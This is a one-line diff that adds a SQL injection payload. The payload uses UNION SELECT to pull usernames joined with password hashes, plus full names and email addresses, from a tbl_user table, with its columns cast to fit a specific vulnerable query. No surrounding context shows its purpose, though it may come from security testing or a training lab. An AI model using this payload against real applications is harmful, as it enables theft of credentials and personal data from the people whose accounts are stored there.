@@ -1,0 +1,1 @@
+' UNION SELECT id, (username || ' | ' || password_hash)::text, 0::numeric(10,2), fullname::text, email::text, null::text, 0::numeric(3,1), 0::integer FROM tbl_user --
